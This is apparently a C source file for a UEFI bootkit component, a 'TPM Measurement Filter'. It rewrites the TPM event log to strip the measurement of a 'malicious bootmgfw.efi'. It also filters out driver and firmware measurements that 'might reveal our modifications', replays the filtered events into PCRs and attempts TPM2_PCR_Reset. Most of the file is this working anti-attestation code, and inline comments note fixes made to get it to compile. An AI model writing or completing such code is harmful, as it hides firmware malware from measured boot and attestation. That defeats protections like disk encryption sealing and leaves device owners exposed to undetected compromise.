#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Protocol/TcgService.h>
#include <Protocol/Tcg2Protocol.h>
#include <IndustryStandard/UefiTcgPlatform.h>
#include <Protocol/LoadedImage.h>
#include <IndustryStandard/Tpm20.h>


// FIX 1: Declare the missing global variables for storing original protocol pointers.
// These are used to call the original TPM functions after our filter has processed them.
static EFI_TCG2_PROTOCOL* mOriginalTcg2Protocol = NULL;
static EFI_TCG_PROTOCOL* mOriginalTcgProtocol = NULL;
static EFI_TCG2_HASH_LOG_EXTEND_EVENT mOriginalTcg2HashLogExtendEvent = NULL;


// TPM Command structures for PCR Reset
#pragma pack(1)
typedef struct {
    TPM_ST              Tag;
    UINT32              CommandSize;
    TPM_CC              CommandCode;
    TPMI_DH_PCR         PcrHandle;
    UINT32              AuthorizationSize;
    TPMS_AUTH_COMMAND   AuthSession;
} TPM2_PCR_RESET_COMMAND;

typedef struct {
    TPM_ST      Tag;
    UINT32      ResponseSize;
    TPM_RC      ResponseCode;
} TPM2_PCR_RESET_RESPONSE;
#pragma pack()


// FIX 2: Removed the redefinition of TCG_PCR_EVENT_HDR, TCG_PCR_EVENT2_HDR,
// and EFI_TCG2_FINAL_EVENTS_TABLE. These are already defined in the included
// standard header <IndustryStandard/UefiTcgPlatform.h>.

// Global variables for event log parsing
static EFI_PHYSICAL_ADDRESS mEventLogLocation = 0;
static EFI_PHYSICAL_ADDRESS mEventLogLastEntry = 0;
static EFI_TCG2_FINAL_EVENTS_TABLE* mFinalEventsTable = NULL;
static BOOLEAN mEventLogTruncated = FALSE;

// Runtime PCR reset capability flags
static BOOLEAN mCanResetRuntimePCRs = FALSE;
static BOOLEAN mCanResetBootPCRs = FALSE; // Requires S3/S4 exploit

// Event filtering criteria
typedef struct {
    UINT32 PCRIndex;
    UINT32 EventType;
    BOOLEAN ShouldSkip;
} EVENT_FILTER_RULE;

// Forward declaration to avoid compilation issues
static EFI_STATUS RemoveBootmgfwFromEventLog(VOID);

// Global variables to track legitimate vs malicious bootmgfw
static EFI_PHYSICAL_ADDRESS mLegitimateBootmgfwImageBase = 0;
static UINT64 mLegitimateBootmgfwImageSize = 0;
static BOOLEAN mLegitimateBootmgfwMeasured = FALSE;

// Define which events to skip (malicious measurements)
EVENT_FILTER_RULE mFilterRules[] = {
    // Skip our driver measurements in PCR 2
    { 2, EV_EFI_RUNTIME_SERVICES_DRIVER, TRUE },
    // Skip suspicious boot services applications in PCR 4  
    { 4, EV_EFI_BOOT_SERVICES_APPLICATION, TRUE },
    // Skip platform firmware measurements that might reveal our modifications
    { 0, EV_EFI_PLATFORM_FIRMWARE_BLOB, TRUE },
    // Add more rules as needed
    { 0, 0, FALSE } // Terminator
};

/**
 * Set the legitimate bootmgfw.efi image information
 * Call this after loading the original bootmgfw.efi but before running it
 */
VOID
SetLegitimateBootmgfwInfo(
    IN EFI_PHYSICAL_ADDRESS ImageBase,
    IN UINT64               ImageSize
)
{
    mLegitimateBootmgfwImageBase = ImageBase;
    mLegitimateBootmgfwImageSize = ImageSize;
    DEBUG((DEBUG_INFO, "Set legitimate bootmgfw info: Base=0x%p, Size=0x%x\n", 
           (VOID*)(UINTN)ImageBase, ImageSize));
}

/**
 * Clean the TPM event log just before chaining to legitimate bootmgfw.efi
 * This removes the malicious bootmgfw.efi measurement from the log
 */
EFI_STATUS
CleanTpmBeforeChaining(
    VOID
)
{
    EFI_STATUS Status;
    
    DEBUG((DEBUG_INFO, "Cleaning TPM event log before chaining to legitimate bootmgfw.efi\n"));
    
    // Execute event log tampering to remove malicious bootmgfw.efi measurements
    Status = RemoveBootmgfwFromEventLog();
    if (EFI_ERROR(Status)) {
        if (Status == EFI_NOT_FOUND) {
            DEBUG((DEBUG_WARN, "No malicious bootmgfw.efi events found to remove\n"));
            // This is OK - maybe it wasn't measured or already cleaned
            return EFI_SUCCESS;
        } else {
            DEBUG((DEBUG_ERROR, "TPM event log tampering failed: %r\n", Status));
            return Status;
        }
    }
    
    DEBUG((DEBUG_INFO, "TPM event log cleaned successfully\n"));
    return EFI_SUCCESS;
}

// FIX 4: Added a stub for the missing IsDriverMeasurement function.
// Replace this with your actual logic to identify your driver's measurements.
BOOLEAN
IsDriverMeasurement(
    IN EFI_PHYSICAL_ADDRESS ImageLocation,
    IN UINT64               ImageLength
)
{
    // Placeholder implementation.
    return FALSE;
}


/**
 * Check if an event should be filtered out
 */
BOOLEAN
ShouldFilterEvent(
    IN UINT32 PCRIndex,
    IN UINT32 EventType,
    IN VOID* EventData,
    IN UINT32 EventSize
)
{
    EVENT_FILTER_RULE* Rule;
    EFI_IMAGE_LOAD_EVENT* ImageEvent;

    // Check against filter rules
    for (Rule = mFilterRules; Rule->PCRIndex != 0 || Rule->EventType != 0; Rule++) {
        if (Rule->PCRIndex == PCRIndex && Rule->EventType == EventType) {

            // Additional checks for image load events
            if (EventType == EV_EFI_RUNTIME_SERVICES_DRIVER ||
                EventType == EV_EFI_BOOT_SERVICES_APPLICATION) {

                if (EventSize >= sizeof(EFI_IMAGE_LOAD_EVENT)) {
                    ImageEvent = (EFI_IMAGE_LOAD_EVENT*)EventData;

                    // Check if this is our driver's image
                    if (IsDriverMeasurement(ImageEvent->ImageLocationInMemory,
                        (UINT64)ImageEvent->ImageLengthInMemory)) { // Cast to UINT64
                        DEBUG((DEBUG_INFO, "Filtering out driver measurement PCR[%d]\n", PCRIndex));
                        return TRUE;
                    }
                }
            }

            if (Rule->ShouldSkip) {
                DEBUG((DEBUG_INFO, "Filtering event: PCR[%d] Type=0x%x\n", PCRIndex, EventType));
                return TRUE;
            }
        }
    }

    return FALSE;
}

/**
 * Execute TPM2_PCR_Reset command
 */
EFI_STATUS
ExecuteTpm2PcrReset(
    IN UINT32 PCRIndex
)
{
    TPM2_PCR_RESET_COMMAND Command;
    TPM2_PCR_RESET_RESPONSE Response;
    UINT32 ResultBufSize;
    EFI_STATUS Status;

    if (mOriginalTcg2Protocol == NULL) {
        return EFI_NOT_READY;
    }

    // Build TPM2_PCR_Reset command
    Command.Tag = SwapBytes16(TPM_ST_SESSIONS);
    Command.CommandSize = SwapBytes32(sizeof(TPM2_PCR_RESET_COMMAND));
    Command.CommandCode = SwapBytes32(TPM_CC_PCR_Reset);
    Command.PcrHandle = SwapBytes32(PCRIndex);

    // Simple password authorization
    Command.AuthorizationSize = SwapBytes32(sizeof(TPMS_AUTH_COMMAND));

    // FIX 3: Corrected the member names of the TPMS_AUTH_COMMAND structure.
    // The names are case-sensitive and must match the Tpm20.h header definition.
    // 'Authorization' was also corrected to 'hmac'.
    Command.AuthSession.sessionHandle = SwapBytes32(TPM_RS_PW);
    Command.AuthSession.nonce.size = 0;
    Command.AuthSession.sessionAttributes.continueSession = 0;
    Command.AuthSession.sessionAttributes.auditExclusive = 0;
    Command.AuthSession.sessionAttributes.auditReset = 0;
    Command.AuthSession.sessionAttributes.decrypt = 0;
    Command.AuthSession.sessionAttributes.encrypt = 0;
    Command.AuthSession.sessionAttributes.audit = 0;
    Command.AuthSession.hmac.size = 0;

    ResultBufSize = sizeof(Response);
    Status = mOriginalTcg2Protocol->SubmitCommand(
        mOriginalTcg2Protocol,
        sizeof(Command),
        (UINT8*)&Command,
        ResultBufSize,
        (UINT8*)&Response
    );

    if (EFI_ERROR(Status)) {
        DEBUG((DEBUG_ERROR, "TPM2_PCR_Reset failed: %r\n", Status));
        return Status;
    }

    // Check TPM response
    if (SwapBytes32(Response.ResponseCode) != TPM_RC_SUCCESS) {
        DEBUG((DEBUG_ERROR, "TPM2_PCR_Reset command failed: 0x%x\n",
            SwapBytes32(Response.ResponseCode)));
        return EFI_DEVICE_ERROR;
    }

    DEBUG((DEBUG_INFO, "Successfully reset PCR[%d]\n", PCRIndex));
    return EFI_SUCCESS;
}

/**
 * Extend a measurement to specific PCR
 */
EFI_STATUS
ExtendMeasurement(
    IN UINT32              PCRIndex,
    IN TPML_DIGEST_VALUES* DigestList,
    IN VOID* EventData,
    IN UINT32              EventSize,
    IN UINT32              EventType
)
{
    EFI_TCG2_EVENT* TcgEvent;
    UINT8* EventBuffer;
    UINT32 EventBufferSize;
    UINT32 DigestListSize;
    EFI_STATUS Status;

    if (mOriginalTcg2Protocol == NULL || mOriginalTcg2HashLogExtendEvent == NULL) {
        return EFI_NOT_READY;
    }

    // Calculate digest list size
    DigestListSize = sizeof(UINT32); // count
    for (UINT32 i = 0; i < DigestList->count; i++) {
        DigestListSize += sizeof(TPMI_ALG_HASH);

        switch (DigestList->digests[i].hashAlg) {
        case TPM_ALG_SHA1:
            DigestListSize += SHA1_DIGEST_SIZE;
            break;
        case TPM_ALG_SHA256:
            DigestListSize += SHA256_DIGEST_SIZE;
            break;
        case TPM_ALG_SHA384:
            DigestListSize += SHA384_DIGEST_SIZE;
            break;
        case TPM_ALG_SHA512:
            DigestListSize += SHA512_DIGEST_SIZE;
            break;
        }
    }

    // Allocate event buffer
    EventBufferSize = sizeof(EFI_TCG2_EVENT_HEADER) + DigestListSize + EventSize;
    EventBuffer = AllocatePool(EventBufferSize);
    if (EventBuffer == NULL) {
        return EFI_OUT_OF_RESOURCES;
    }

    TcgEvent = (EFI_TCG2_EVENT*)EventBuffer;
    TcgEvent->Size = EventBufferSize;
    TcgEvent->Header.HeaderSize = sizeof(EFI_TCG2_EVENT_HEADER);
    TcgEvent->Header.HeaderVersion = EFI_TCG2_EVENT_HEADER_VERSION;
    TcgEvent->Header.PCRIndex = PCRIndex;
    TcgEvent->Header.EventType = EventType;

    // Copy digest list
    CopyMem((UINT8*)TcgEvent->Event + sizeof(EFI_TCG2_EVENT_HEADER), DigestList, DigestListSize);

    // Copy event data
    if (EventSize > 0 && EventData != NULL) {
        CopyMem((UINT8*)TcgEvent->Event + sizeof(EFI_TCG2_EVENT_HEADER) + DigestListSize,
            EventData, EventSize);
    }

    // Use original protocol to perform the extension
    Status = mOriginalTcg2HashLogExtendEvent(
        mOriginalTcg2Protocol,
        0, // Flags
        (EFI_PHYSICAL_ADDRESS)0, // DataToHash (we provide pre-computed digests)
        0, // DataToHashLen  
        TcgEvent
    );

    FreePool(EventBuffer);

    if (EFI_ERROR(Status)) {
        DEBUG((DEBUG_ERROR, "Failed to extend PCR[%d]: %r\n", PCRIndex, Status));
    }
    else {
        DEBUG((DEBUG_INFO, "Extended PCR[%d] with filtered event\n", PCRIndex));
    }

    return Status;
}

/**
 * Parse and replay TCG 1.2 event log
 */
EFI_STATUS
ReplayTcg12EventLog(
    IN UINT8* EventLogData,
    IN UINTN  EventLogSize
)
{
    TCG_PCR_EVENT* Event; // Correct type from UefiTcgPlatform.h
    UINT8* CurrentPos;
    UINT8* EventLogEnd;
    TPML_DIGEST_VALUES DigestList;
    EFI_STATUS Status;
    UINT32 EventsParsed = 0;
    UINT32 EventsFiltered = 0;

    CurrentPos = EventLogData;
    EventLogEnd = EventLogData + EventLogSize;

    DEBUG((DEBUG_INFO, "Parsing TCG 1.2 event log, size: 0x%x\n", EventLogSize));

    while (CurrentPos < EventLogEnd) {
        Event = (TCG_PCR_EVENT*)CurrentPos;

        // Validate event size
        if (CurrentPos + sizeof(TCG_PCR_EVENT) - 1 + Event->EventSize > EventLogEnd) {
            DEBUG((DEBUG_ERROR, "Invalid event size at offset 0x%x\n",
                (UINTN)(CurrentPos - EventLogData)));
            break;
        }

        EventsParsed++;

        // Check if we should filter this event
        if (ShouldFilterEvent(Event->PCRIndex, Event->EventType,
            (UINT8*)Event->Event,
            Event->EventSize)) {
            EventsFiltered++;
            goto NextEvent;
        }

        // Convert SHA1 digest to TPM2.0 format
        DigestList.count = 1;
        DigestList.digests[0].hashAlg = TPM_ALG_SHA1;
        CopyMem(DigestList.digests[0].digest.sha1, &Event->Digest, SHA1_DIGEST_SIZE);

        // Replay this measurement
        Status = ExtendMeasurement(
            Event->PCRIndex,
            &DigestList,
            (UINT8*)Event->Event,
            Event->EventSize,
            Event->EventType
        );

        if (EFI_ERROR(Status)) {
            DEBUG((DEBUG_ERROR, "Failed to replay event %d: %r\n", EventsParsed, Status));
        }

    NextEvent:
        CurrentPos += sizeof(TCG_PCR_EVENT) - 1 + Event->EventSize;
    }

    DEBUG((DEBUG_INFO, "TCG 1.2 replay complete: %d events parsed, %d filtered\n",
        EventsParsed, EventsFiltered));

    return EFI_SUCCESS;
}

/**
 * Parse and replay TCG 2.0 event log
 */
EFI_STATUS
ReplayTcg20EventLog(
    IN UINT8* EventLogData,
    IN UINTN  EventLogSize
)
{
    TCG_PCR_EVENT2* Event;
    UINT8* CurrentPos;
    UINT8* EventLogEnd;
    UINT8* DigestPtr;
    UINT32 DigestCount;
    UINT32 DigestSize;
    EFI_STATUS Status;
    UINT32 EventsParsed = 0;
    UINT32 EventsFiltered = 0;
    UINTN  EventHeaderSize;
    TPML_DIGEST_VALUES* DigestList;

    CurrentPos = EventLogData;
    EventLogEnd = EventLogData + EventLogSize;

    DEBUG((DEBUG_INFO, "Parsing TCG 2.0 event log, size: 0x%x\n", EventLogSize));

    while (CurrentPos < EventLogEnd) {
        Event = (TCG_PCR_EVENT2*)CurrentPos;

        // Calculate event header size
        EventHeaderSize = sizeof(TCG_PCR_EVENT2_HDR);

        EventsParsed++;

        // Get pointer to digest list - it's right after the header
        DigestList = (TPML_DIGEST_VALUES*)((UINT8*)Event + EventHeaderSize);
        DigestCount = DigestList->count;

        // Calculate total digest list size
        DigestSize = sizeof(UINT32); // count field
        for (UINT32 i = 0; i < DigestCount; i++) {
            TPMI_ALG_HASH HashAlg = DigestList->digests[i].hashAlg;
            DigestSize += sizeof(TPMI_ALG_HASH);

            switch (HashAlg) {
            case TPM_ALG_SHA1:   DigestSize += SHA1_DIGEST_SIZE;   break;
            case TPM_ALG_SHA256: DigestSize += SHA256_DIGEST_SIZE; break;
            case TPM_ALG_SHA384: DigestSize += SHA384_DIGEST_SIZE; break;
            case TPM_ALG_SHA512: DigestSize += SHA512_DIGEST_SIZE; break;
            default:
                DEBUG((DEBUG_ERROR, "Unknown hash algorithm: 0x%x\n", HashAlg));
                goto NextEvent2;
            }
        }

        // Calculate event data position
        UINT8* EventData = (UINT8*)Event + EventHeaderSize + DigestSize;
        UINT32 EventSize = Event->EventSize;

        // Validate event bounds
        if (EventData + EventSize > EventLogEnd) {
            DEBUG((DEBUG_ERROR, "Invalid TCG2 event size\n"));
            break;
        }

        // Check if we should filter this event
        if (ShouldFilterEvent(Event->PCRIndex, Event->EventType, EventData, EventSize)) {
            EventsFiltered++;
            goto NextEvent2;
        }

        // Replay this measurement
        Status = ExtendMeasurement(
            Event->PCRIndex,
            DigestList,
            EventData,
            EventSize,
            Event->EventType
        );

        if (EFI_ERROR(Status)) {
            DEBUG((DEBUG_ERROR, "Failed to replay TCG2 event %d: %r\n", EventsParsed, Status));
        }

    NextEvent2:
        CurrentPos += EventHeaderSize + DigestSize + EventSize;
    }

    DEBUG((DEBUG_INFO, "TCG 2.0 replay complete: %d events parsed, %d filtered\n",
        EventsParsed, EventsFiltered));

    return EFI_SUCCESS;
}

/**
 * Detect if runtime PCR reset is possible
 */
VOID
DetectPcrResetCapability(
    VOID
)
{
    EFI_STATUS Status;
    UINT32 TestPCR = 16; // Runtime PCR for testing

    // Initialize capability flags to FALSE
    mCanResetRuntimePCRs = FALSE;
    mCanResetBootPCRs = FALSE;

    // Only test if we have TPM2 protocol available
    if (mOriginalTcg2Protocol == NULL) {
        DEBUG((DEBUG_WARN, "TPM2 protocol not available - PCR reset not supported\n"));
        return;
    }

    // Try to reset PCR 16 (debug PCR that should be resettable)
    Status = ExecuteTpm2PcrReset(TestPCR);
    if (!EFI_ERROR(Status)) {
        mCanResetRuntimePCRs = TRUE;
        DEBUG((DEBUG_INFO, "Runtime PCR reset capability detected\n"));
    }
    else {
        DEBUG((DEBUG_WARN, "Runtime PCR reset not available: %r\n", Status));
    }

    // TODO: Implement S3/S4 sleep state detection for boot PCR reset
    // This would require ACPI sleep state manipulation
    mCanResetBootPCRs = FALSE;
}

/**
 * Get the current event log from TCG protocols
 */
EFI_STATUS
GetCurrentEventLog(
    VOID
)
{
    EFI_STATUS Status;
    TCG_EFI_BOOT_SERVICE_CAPABILITY ProtocolCapability;
    UINT32 TCGFeatureFlags;

    if (mOriginalTcg2Protocol != NULL) {
        // Try TCG2 protocol first
        Status = mOriginalTcg2Protocol->GetEventLog(
            mOriginalTcg2Protocol,
            EFI_TCG2_EVENT_LOG_FORMAT_TCG_2,
            &mEventLogLocation,
            &mEventLogLastEntry,
            &mEventLogTruncated
        );

        if (!EFI_ERROR(Status)) {
            DEBUG((DEBUG_INFO, "Got TCG2 event log: Location=0x%p, LastEntry=0x%p\n",
                (VOID*)(UINTN)mEventLogLocation, (VOID*)(UINTN)mEventLogLastEntry));
            return EFI_SUCCESS;
        }
    }

    if (mOriginalTcgProtocol != NULL) {
        // For TCG 1.2 protocol, use StatusCheck to get event log location
        ProtocolCapability.Size = sizeof(TCG_EFI_BOOT_SERVICE_CAPABILITY);
        TCGFeatureFlags = 0;

        Status = mOriginalTcgProtocol->StatusCheck(
            mOriginalTcgProtocol,
            &ProtocolCapability,
            &TCGFeatureFlags,
            &mEventLogLocation,
            &mEventLogLastEntry
        );

        if (!EFI_ERROR(Status)) {
            DEBUG((DEBUG_INFO, "Got TCG 1.2 event log: Location=0x%p, LastEntry=0x%p\n",
                (VOID*)(UINTN)mEventLogLocation, (VOID*)(UINTN)mEventLogLastEntry));

            // For TCG 1.2, we need to determine if the log is truncated
            // This is a simple heuristic - if last entry is 0, assume not truncated
            mEventLogTruncated = (mEventLogLastEntry == 0) ? FALSE : TRUE;

            return EFI_SUCCESS;
        }
    }

    DEBUG((DEBUG_ERROR, "Failed to get event log\n"));
    return EFI_NOT_FOUND;
}

/**
 * Check if an event contains a malicious bootmgfw.efi measurement (not the legitimate one)
 */
BOOLEAN
IsBootmgfwMeasurementEvent(
    IN VOID* EventData,
    IN UINT32 EventSize,
    IN UINT32 EventType
)
{
    EFI_IMAGE_LOAD_EVENT* ImageEvent;
    CHAR16* FilePath;
    UINTN FilePathLen;
    BOOLEAN IsBootmgfwFile = FALSE;
    
    // Only check image load events
    if (EventType != EV_EFI_BOOT_SERVICES_APPLICATION && 
        EventType != EV_EFI_RUNTIME_SERVICES_DRIVER) {
        return FALSE;
    }
    
    if (EventSize < sizeof(EFI_IMAGE_LOAD_EVENT)) {
        return FALSE;
    }
    
    ImageEvent = (EFI_IMAGE_LOAD_EVENT*)EventData;
    
    // Check if the file path contains "bootmgfw.efi"
    if (ImageEvent->LengthOfDevicePath > 0 && 
        EventSize > sizeof(EFI_IMAGE_LOAD_EVENT) + ImageEvent->LengthOfDevicePath) {
        
        FilePath = (CHAR16*)((UINT8*)EventData + sizeof(EFI_IMAGE_LOAD_EVENT) + ImageEvent->LengthOfDevicePath);
        FilePathLen = (EventSize - sizeof(EFI_IMAGE_LOAD_EVENT) - ImageEvent->LengthOfDevicePath) / sizeof(CHAR16);
        
        // Safely check for bootmgfw.efi in the file path
        for (UINTN i = 0; i < FilePathLen - 11; i++) { // 11 = length of "bootmgfw.efi" - 1
            if ((FilePath[i] == L'b' || FilePath[i] == L'B') &&
                (FilePath[i+1] == L'o' || FilePath[i+1] == L'O') &&
                (FilePath[i+2] == L'o' || FilePath[i+2] == L'O') &&
                (FilePath[i+3] == L't' || FilePath[i+3] == L'T') &&
                (FilePath[i+4] == L'm' || FilePath[i+4] == L'M') &&
                (FilePath[i+5] == L'g' || FilePath[i+5] == L'G') &&
                (FilePath[i+6] == L'f' || FilePath[i+6] == L'F') &&
                (FilePath[i+7] == L'w' || FilePath[i+7] == L'W') &&
                FilePath[i+8] == L'.' &&
                (FilePath[i+9] == L'e' || FilePath[i+9] == L'E') &&
                (FilePath[i+10] == L'f' || FilePath[i+10] == L'F') &&
                (FilePath[i+11] == L'i' || FilePath[i+11] == L'I')) {
                
                IsBootmgfwFile = TRUE;
                break;
            }
        }
    }
    
    if (!IsBootmgfwFile) {
        return FALSE; // Not a bootmgfw.efi file at all
    }
    
    // This is a bootmgfw.efi measurement - now determine if it's legitimate or malicious
    EFI_PHYSICAL_ADDRESS ImageBase = ImageEvent->ImageLocationInMemory;
    UINT64 ImageSize = (UINT64)ImageEvent->ImageLengthInMemory;
    
    // If we haven't seen the legitimate bootmgfw yet, this might be it
    if (!mLegitimateBootmgfwMeasured && 
        mLegitimateBootmgfwImageBase != 0 &&
        ImageBase == mLegitimateBootmgfwImageBase &&
        ImageSize == mLegitimateBootmgfwImageSize) {
        
        // This matches the legitimate bootmgfw we loaded - allow it
        mLegitimateBootmgfwMeasured = TRUE;
        DEBUG((DEBUG_INFO, "Found legitimate bootmgfw.efi measurement - preserving\n"));
        return FALSE; // Don't filter this one
    }
    
    // This is a bootmgfw.efi measurement that doesn't match our legitimate one
    // It's likely our malicious bootmgfw.efi that was measured at boot
    DEBUG((DEBUG_INFO, "Found malicious bootmgfw.efi measurement - removing (Base=0x%p, Size=0x%x)\n", 
           (VOID*)(UINTN)ImageBase, ImageSize));
    return TRUE; // Filter this one out
}

/**
 * Remove bootmgfw.efi measurements from TPM event log
 */
 static EFI_STATUS
RemoveBootmgfwFromEventLog(
    VOID
)
{
    UINT8* EventLogData;
    UINTN EventLogSize;
    UINT8* CurrentPos;
    UINT8* EventLogEnd;
    UINT8* WritePos;
    UINT32 EventsRemoved = 0;
    
    DEBUG((DEBUG_INFO, "Starting bootmgfw.efi event log tampering...\n"));
    
    // Get current event log
    EFI_STATUS Status = GetCurrentEventLog();
    if (EFI_ERROR(Status)) {
        DEBUG((DEBUG_ERROR, "Failed to get event log: %r\n", Status));
        return Status;
    }
    
    // Calculate event log size
    if (mEventLogLastEntry > mEventLogLocation) {
        EventLogSize = (UINTN)(mEventLogLastEntry - mEventLogLocation);
    } else {
        EventLogSize = 0x10000; // Default size
    }
    
    EventLogData = (UINT8*)(UINTN)mEventLogLocation;
    EventLogEnd = EventLogData + EventLogSize;
    CurrentPos = EventLogData;
    WritePos = EventLogData;
    
    DEBUG((DEBUG_INFO, "Event log location: 0x%p, size: 0x%x\n", EventLogData, EventLogSize));
    
    // Process events based on protocol type
    if (mOriginalTcg2Protocol != NULL) {
        // TCG 2.0 event log format
        while (CurrentPos < EventLogEnd) {
            TCG_PCR_EVENT2* Event = (TCG_PCR_EVENT2*)CurrentPos;
            UINTN EventHeaderSize = sizeof(TCG_PCR_EVENT2_HDR);
            
            // Bounds check for event header
            if (CurrentPos + EventHeaderSize > EventLogEnd) {
                DEBUG((DEBUG_ERROR, "Invalid event header bounds\n"));
                break;
            }
            
            // Calculate digest list size
            TPML_DIGEST_VALUES* DigestList = (TPML_DIGEST_VALUES*)((UINT8*)Event + EventHeaderSize);
            UINT32 DigestSize = sizeof(UINT32); // count field
            
            // Bounds check for digest count
            if (CurrentPos + EventHeaderSize + sizeof(UINT32) > EventLogEnd) {
                DEBUG((DEBUG_ERROR, "Invalid digest count bounds\n"));
                break;
            }
            
            // Sanity check on digest count
            if (DigestList->count > 8) { // Reasonable maximum
                DEBUG((DEBUG_ERROR, "Invalid digest count: %d\n", DigestList->count));
                break;
            }
            
            for (UINT32 i = 0; i < DigestList->count; i++) {
                TPMI_ALG_HASH HashAlg = DigestList->digests[i].hashAlg;
                DigestSize += sizeof(TPMI_ALG_HASH);
                
                switch (HashAlg) {
                case TPM_ALG_SHA1:   DigestSize += SHA1_DIGEST_SIZE;   break;
                case TPM_ALG_SHA256: DigestSize += SHA256_DIGEST_SIZE; break;
                case TPM_ALG_SHA384: DigestSize += SHA384_DIGEST_SIZE; break;
                case TPM_ALG_SHA512: DigestSize += SHA512_DIGEST_SIZE; break;
                default: 
                    DEBUG((DEBUG_WARN, "Unknown hash algorithm: 0x%x\n", HashAlg));
                    goto NextEvent2;
                }
            }
            
            UINT8* EventData = (UINT8*)Event + EventHeaderSize + DigestSize;
            UINT32 EventDataSize = Event->EventSize;
            UINTN TotalEventSize = EventHeaderSize + DigestSize + EventDataSize;
            
            // Bounds check for complete event
            if (CurrentPos + TotalEventSize > EventLogEnd) {
                DEBUG((DEBUG_ERROR, "Event extends beyond log bounds\n"));
                break;
            }
            
            // Check if this is a bootmgfw.efi event
            if (IsBootmgfwMeasurementEvent(EventData, EventDataSize, Event->EventType)) {
                DEBUG((DEBUG_INFO, "Removing bootmgfw.efi event from log\n"));
                EventsRemoved++;
                // Skip this event (don't copy it)
            } else {
                // Copy this event if we're not at the same position
                if (WritePos != CurrentPos) {
                    CopyMem(WritePos, CurrentPos, TotalEventSize);
                }
                WritePos += TotalEventSize;
            }
            
        NextEvent2:
            CurrentPos += TotalEventSize;
        }
    } else if (mOriginalTcgProtocol != NULL) {
        // TCG 1.2 event log format
        while (CurrentPos < EventLogEnd) {
            TCG_PCR_EVENT* Event = (TCG_PCR_EVENT*)CurrentPos;
            
            // Bounds check for event header
            if (CurrentPos + sizeof(TCG_PCR_EVENT) - 1 > EventLogEnd) {
                DEBUG((DEBUG_ERROR, "Invalid TCG 1.2 event header bounds\n"));
                break;
            }
            
            // Sanity check on event size
            if (Event->EventSize > 0x10000) { // 64KB maximum
                DEBUG((DEBUG_ERROR, "Invalid TCG 1.2 event size: %d\n", Event->EventSize));
                break;
            }
            
            UINTN TotalEventSize = sizeof(TCG_PCR_EVENT) - 1 + Event->EventSize;
            
            // Bounds check for complete event
            if (CurrentPos + TotalEventSize > EventLogEnd) {
                DEBUG((DEBUG_ERROR, "TCG 1.2 event extends beyond log bounds\n"));
                break;
            }
            
            // Check if this is a bootmgfw.efi event
            if (IsBootmgfwMeasurementEvent((UINT8*)Event->Event, Event->EventSize, Event->EventType)) {
                DEBUG((DEBUG_INFO, "Removing bootmgfw.efi event from TCG 1.2 log\n"));
                EventsRemoved++;
                // Skip this event
            } else {
                // Copy this event if we're not at the same position
                if (WritePos != CurrentPos) {
                    CopyMem(WritePos, CurrentPos, TotalEventSize);
                }
                WritePos += TotalEventSize;
            }
            
            CurrentPos += TotalEventSize;
        }
    }
    
    // Zero out the remaining space
    if (WritePos < EventLogEnd) {
        ZeroMem(WritePos, EventLogEnd - WritePos);
        // Update the last entry pointer
        mEventLogLastEntry = mEventLogLocation + (WritePos - EventLogData);
    }
    
    DEBUG((DEBUG_INFO, "Event log tampering complete: %d bootmgfw.efi events removed\n", EventsRemoved));
    
    if (EventsRemoved > 0) {
        return EFI_SUCCESS;
    } else {
        DEBUG((DEBUG_WARN, "No bootmgfw.efi events found to remove\n"));
        return EFI_NOT_FOUND;
    }
}

/**
 * Initialize TPM protocols and locate them
 */
EFI_STATUS
InitializeTpmProtocols(
    VOID
)
{
    EFI_STATUS Status;
    
    // Try to locate TCG2 protocol first (TPM 2.0)
    Status = gBS->LocateProtocol(
        &gEfiTcg2ProtocolGuid,
        NULL,
        (VOID**)&mOriginalTcg2Protocol
    );
    
    if (!EFI_ERROR(Status) && mOriginalTcg2Protocol != NULL) {
        // Store the original HashLogExtendEvent function
        mOriginalTcg2HashLogExtendEvent = mOriginalTcg2Protocol->HashLogExtendEvent;
        DEBUG((DEBUG_INFO, "TCG2 Protocol (TPM 2.0) located successfully\n"));
        return EFI_SUCCESS;
    }
    
    // Fall back to TCG 1.2 protocol
    Status = gBS->LocateProtocol(
        &gEfiTcgProtocolGuid,
        NULL,
        (VOID**)&mOriginalTcgProtocol
    );
    
    if (!EFI_ERROR(Status) && mOriginalTcgProtocol != NULL) {
        DEBUG((DEBUG_INFO, "TCG Protocol (TPM 1.2) located successfully\n"));
        return EFI_SUCCESS;
    }
    
    DEBUG((DEBUG_ERROR, "No TPM protocols found - TPM not available\n"));
    return EFI_NOT_FOUND;
}

/**
 * Initialize TPM reset and replay system
 */
EFI_STATUS
InitializeTpmResetReplay(
    VOID
)
{
    EFI_STATUS Status;

    // First initialize TPM protocols
    Status = InitializeTpmProtocols();
    if (EFI_ERROR(Status)) {
        DEBUG((DEBUG_ERROR, "Failed to initialize TPM protocols: %r\n", Status));
        return Status;
    }

    // Wait for trusted bootmgfw digest to be computed
    // Status = UpdateTrustedBootmgfwDigest();
    // if (EFI_ERROR(Status)) {
    //     DEBUG((DEBUG_WARN, "Trusted digest not ready, will retry later\n"));
    // }

    // Don't remove bootmgfw measurements yet - wait until just before chaining
    DEBUG((DEBUG_INFO, "TPM protocols initialized - event log tampering will happen just before chaining\n"));

    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
TpmMeasurementFilterEntry(
    IN EFI_HANDLE        ImageHandle,
    IN EFI_SYSTEM_TABLE* SystemTable
)
{
    EFI_STATUS Status;

    DEBUG((DEBUG_INFO, "TPM Measurement Filter Entry Point\n"));

    // Initialize the TPM reset and replay system
    Status = InitializeTpmResetReplay();
    if (EFI_ERROR(Status)) {
        if (Status == EFI_NOT_FOUND) {
            DEBUG((DEBUG_WARN, "TPM not available on this system - continuing without TPM filtering\n"));
            return EFI_SUCCESS; // Continue boot even if TPM is not available
        } else if (Status == EFI_UNSUPPORTED) {
            DEBUG((DEBUG_WARN, "TPM reset/replay not supported on this system - continuing without TPM filtering\n"));
            return EFI_SUCCESS; // Continue boot even if TPM features are not supported
        } else {
            DEBUG((DEBUG_ERROR, "Failed to initialize TPM reset and replay: %r\n", Status));
            return Status; // Only return error for critical failures
        }
    }

    DEBUG((DEBUG_INFO, "TPM Measurement Filter initialized successfully\n"));
    return EFI_SUCCESS;
}